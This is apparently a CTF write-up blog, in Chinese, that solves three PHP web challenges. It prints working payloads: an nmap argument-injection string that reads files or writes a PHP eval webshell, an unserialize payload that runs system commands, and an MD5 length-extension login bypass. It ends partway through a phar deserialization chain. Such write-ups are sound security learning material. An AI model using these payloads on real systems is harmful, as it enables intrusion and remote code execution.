<p><a href="https://imgchr.com/i/0diLlj" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/07/0diLlj.png" srcset="/img/loading.gif" alt="0diLlj.png"></a></p>
<h1 id="2020-网鼎杯-朱雀组-Web-nmap"><a href="#2020-网鼎杯-朱雀组-Web-nmap" class="headerlink" title="2020-网鼎杯-朱雀组-Web-nmap"></a>2020-网鼎杯-朱雀组-Web-nmap</h1><p> <strong>考点：参数逃逸，nmap使用</strong></p>
<p>打开就是nmap扫描，查看源码发现提示 /flag</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5CUsers%5C12986%5CDesktop%5C3.png" srcset="/img/loading.gif" alt="3"></p>
<p>nmap这类题会想到的两个函数：</p>
<pre><code>string escapeshellarg ( string $arg )
string escapeshellcmd ( string $command)</code></pre><p><strong>escapeshellarg</strong> — 把字符串转码为可以在 shell 命令里使用的参数</p>
<p>转义字符串$arg中的单引号并使用单引号包裹此部分</p>
<p>使得$arg只能传递一个参数，且不能执行不同的命令；</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201011162454612.png" srcset="/img/loading.gif" alt="image-20201011162454612"></p>
<p><strong>escapeshellcmd</strong> — shell 元字符转义</p>
<p>对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。</p>
<p>转义&amp; # ; ` | * ? ~ &lt; &gt; ^ ( ) [ ] { } $ 、x0A和xF，’和”仅在落单时被转义</p>
<p>使得$command只能执行一个命令，但可以传递多个参数；</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201011163816415.png" srcset="/img/loading.gif" alt="image-20201011163816415"></p>
<p>然而这两个函数一起出现就会存在问题（arg先，cmd后），如图，文本被分为三个部分：</p>
<p>简化后为：<strong>12\ 3&#39;</strong></p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201011165732532.png" srcset="/img/loading.gif" alt="image-20201011165732532"></p>
<p>综上可以构造payload:</p>
<pre><code>127.0.0.1&#39; -iL /flag -oN aaa.txt &#39;</code></pre><p>本地测试如下：</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201011175635921.png" srcset="/img/loading.gif" alt="image-20201011175635921"></p>
<p>访问aaa.txt，得到flag。这里也可以看到最后执行的命令。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201011175837439.png" srcset="/img/loading.gif" alt="image-20201011175837439"></p>
<p>网上的其他做法是传马；</p>
<p>payload</p>
<pre><code>&#39; &lt;?= @eval($_POST[&quot;pd&quot;]);?&gt; -oG pd.phtml &#39;</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201011182343649.png" srcset="/img/loading.gif" alt="image-20201011182343649"></p>
<h1 id="2020-网鼎杯-朱雀组-Web-phpweb"><a href="#2020-网鼎杯-朱雀组-Web-phpweb" class="headerlink" title="2020-网鼎杯-朱雀组-Web-phpweb"></a>2020-网鼎杯-朱雀组-Web-phpweb</h1><p>主页东西很少，页面定时提交表单刷新。</p>
<p>抓个包看一下,应该是执行的函数和他的传参</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201011194538663.png" srcset="/img/loading.gif" alt="image-20201011194538663"></p>
<p>用eval执行phpinfo被拦住了，需要绕过waf。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201011194803464.png" srcset="/img/loading.gif" alt="image-20201011194803464"></p>
<p>先读一下index.php</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201011195421461.png" srcset="/img/loading.gif" alt="image-20201011195421461"></p>
<pre class=" language-php+HTML"><code class="language-php+HTML"><!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.9.0">
    <title>phpweb</title>
    <style type="text/css">
        body {
            background: url("bg.jpg") no-repeat;
            background-size: 100%;
        }
        p {
            color: white;
        }
    </style>
<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>

<body>
<script language="javascript">
    setTimeout("document.form1.submit()",5000)
</script>
<p>
    <?php
    $disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");
    function gettime($func, $p) {
        $result = call_user_func($func, $p);
        $a= gettype($result);
        if ($a == "string") {
            return $result;
        } else {return "";}
    }
    class Test {
        var $p = "Y-m-d h:i:s a";
        var $func = "date";
        function __destruct() {
            if ($this->func != "") {
                echo gettime($this->func, $this->p);
            }
        }
    }
    $func = $_REQUEST["func"];
    $p = $_REQUEST["p"];

    if ($func != null) {
        $func = strtolower($func);
        if (!in_array($func,$disable_fun)) {
            echo gettime($func, $p);
        }else {
            die("Hacker...");
        }
    }
    ?>
</p>
<form id="form1" name="form1" action="index.php" method="post">
    <input type="hidden" id="func" name="func" value="date">
    <input type="hidden" id="p" name="p" value="Y-m-d h:i:s a">
</form></body>
</html></code></pre>
<p>能禁的基本都禁了。</p>
<p>但这个gettime方法里有call_user_func函数，再加上本身有个Test类，那就可以用反序列化了。</p>
<pre><code>&lt;?php
    class Test {
        var $p = &quot;ls&quot;;
        var $func = &quot;system&quot;;
    }
$a=new Test();
echo serialize($a);
?&gt;</code></pre><p>payload如下，可以看到执行成功；</p>
<pre><code>func=unserialize&amp;p=O:4:&quot;Test&quot;:2:{s:1:&quot;p&quot;;s:2:&quot;ls&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;}</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201011200952514.png" srcset="/img/loading.gif" alt="image-20201011200952514"></p>
<p>相似的，查看根目录再读取flag。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201011201319348.png" srcset="/img/loading.gif" alt="image-20201011201319348"></p>
<p>payload:</p>
<pre><code>func=unserialize&amp;p=O:4:&quot;Test&quot;:2:{s:1:&quot;p&quot;;s:20:&quot;cat /flag_2911028111&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;}</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201011201411539.png" srcset="/img/loading.gif" alt="image-20201011201411539"></p>
<h2 id="ByteCTF-2019-Web-ezcms"><a href="#ByteCTF-2019-Web-ezcms" class="headerlink" title="ByteCTF-2019-Web-ezcms"></a>ByteCTF-2019-Web-ezcms</h2><p>考点：md5拓展攻击，phar反序列化</p>
<p>进来是个登录界面</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201019174530573.png" srcset="/img/loading.gif" alt="image-20201019174530573"></p>
<p>随便输下账户密码进入文件上传界面</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201019174621449.png" srcset="/img/loading.gif" alt="image-20201019174621449"></p>
<p>点这个view detail是下面这种界面，返回上传的文件类型和文件位置。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201019174712097.png" srcset="/img/loading.gif" alt="image-20201019174712097"></p>
<p>随便上传一个文件，出现下面的回显。也就是说上传要求admin权限。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201021170641488.png" srcset="/img/loading.gif" alt="image-20201021170641488"></p>
<p>先扫一下，扫出了<a href="http://www.zip。代码审计。" target="_blank" rel="noopener">www.zip。代码审计。</a></p>
<p>index.php是刚刚的登录页面，它要求传入的password不能等于”admin”。</p>
<pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//index.php</span>
<span class="token delimiter">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'config.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$password</span> <span class="token operator">===</span> <span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"u r not admin !!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string">'&lt;script>location.href="upload.php";&lt;/script>'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>
<p>看下config.php相关登录的部分,可以用md5拓展攻击满足条件。</p>
<pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//config.php</span>

<span class="token keyword">function</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>

    <span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token string">"********"</span><span class="token punctuation">;</span>
    <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">"hash"</span><span class="token punctuation">,</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$secret</span><span class="token punctuation">.</span><span class="token string">"adminadmin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">is_admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token string">"********"</span><span class="token punctuation">;</span>
    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$username</span> <span class="token operator">==</span> <span class="token string">"admin"</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$password</span> <span class="token operator">!=</span> <span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$secret</span><span class="token punctuation">.</span><span class="token variable">$username</span><span class="token punctuation">.</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">Profile</span><span class="token punctuation">{</span>

    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$admin</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">is_admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token string">"********"</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">===</span> <span class="token string">"admin"</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">!=</span> <span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$secret</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
                <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>

    <span class="token punctuation">}</span>
    <span class="token keyword">function</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$arguments</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">admin</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">Admin</span><span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$size</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$checker</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$file_tmp</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$upload_dir</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$content_check</span><span class="token punctuation">;</span>

    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$file_tmp</span><span class="token punctuation">,</span> <span class="token variable">$size</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">upload_dir</span> <span class="token operator">=</span> <span class="token string">'sandbox/'</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">upload_dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">upload_dir</span><span class="token punctuation">,</span> <span class="token number">0777</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">upload_dir</span><span class="token punctuation">.</span><span class="token string">'/.htaccess'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">upload_dir</span><span class="token punctuation">.</span><span class="token string">'/.htaccess'</span><span class="token punctuation">,</span> <span class="token string">'lolololol, i control all'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">size</span> <span class="token operator">=</span> <span class="token variable">$size</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file_tmp</span> <span class="token operator">=</span> <span class="token variable">$file_tmp</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content_check</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Check</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file_tmp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$profile</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Profile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">checker</span> <span class="token operator">=</span> <span class="token variable">$profile</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">is_admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将是否为admin的结果存入$checker</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">upload_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">checker</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'u r not admin'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">content_check</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$tmp</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token variable">$tmp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">size</span> <span class="token operator">></span> <span class="token number">204800</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"your file is too big"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file_tmp</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">upload_dir</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'.'</span><span class="token punctuation">.</span><span class="token variable">$ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$arguments</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>

    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>
<p>//用hashpump构造payload</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201021170019191.png" srcset="/img/loading.gif" alt="image-20201021170019191"></p>
<p>向用户名传admin,密码传这个进行登录。</p>
<pre><code>admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90%00%00%00%00%00%00%00dwm2</code></pre><p>再向上传界面添加cookie user后，刷新页面。</p>
<pre><code>user=4a4273909fdfabb4aa22b55264e7330e</code></pre><p>可以看到文件已经上传成功了。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201021170500217.png" srcset="/img/loading.gif" alt="image-20201021170500217"></p>
<p>要想方法传shell。但从源码中可以看到，由于.htaccess内容完全被控制，导致php文件无法正常解析。</p>
<pre class=" language-php"><code class="language-php">    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">.</span><span class="token string">'/.htaccess'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">.</span><span class="token string">'/.htaccess'</span><span class="token punctuation">,</span> <span class="token string">'lolololol, i control all'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span></code></pre>
<p>其实看到这么多魔术方法应该就往反序列化方向考虑。</p>
<p>看一下File类。</p>
<p>有可控参数filename和filepath，</p>
<p>在view_detail函数中对filepath做了一些有关伪协议的过滤。</p>
<p>然后通过mime_content_type函数对文件类型进行检测，重点就在于这个函数通过_php_finfo_get_type间接调用了关键函数php_stream_open_wrapper_ex,导致此处可以触发phar反序列化。</p>
<p>思路就是构造pop链删除或重写.htaccess/干脆换一个目录。</p>
<pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">File</span><span class="token punctuation">{</span>

    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$filepath</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$checker</span><span class="token punctuation">;</span>

    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$filepath</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filepath</span> <span class="token operator">=</span> <span class="token variable">$filepath</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">view_detail</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^(phar|compress|compose.zlib|zip|rar|file|ftp|zlib|data|glob|ssh|expect)/i'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filepath</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"nonono~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$mine</span> <span class="token operator">=</span> <span class="token function">mime_content_type</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filepath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$store_path</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filepath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$res</span><span class="token punctuation">[</span><span class="token string">'mine'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$mine</span><span class="token punctuation">;</span>
        <span class="token variable">$res</span><span class="token punctuation">[</span><span class="token string">'store_path'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$store_path</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span>

    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$filepath</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token string">"$filename is in $filepath"</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">checker</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">checker</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">upload_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
</code></pre>
<p>继续向下看代码，思考如何构建链。File类的析构函数中checker调用了本类不存在的函数upload_file(),这让人想到_ _ call()方法，而Profile类中正好存在可利用的_ _call，在call方法中$admin调用了open方法。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201025161531936.png" srcset="/img/loading.gif" alt="image-20201025161531936"></p>
<p>这是题目的open方法。这样看好像没什么出路了。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201025163002411.png" srcset="/img/loading.gif" alt="image-20201025163002411"></p>
<p>但是类中的admin是可控的，如果我们将admin定义为php中一个内置类的对象，且这个类有open函数，功能是删除或更改文件信息就能达到目的。如图，搜到了ZipArchive类。</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/image-20201025175111185.png" srcset="/img/loading.gif" alt="image-20201025175111185"></p>
<p>参数：filename文件名，flags是打开文档的模式，这里的参数就选择这两个。</p>
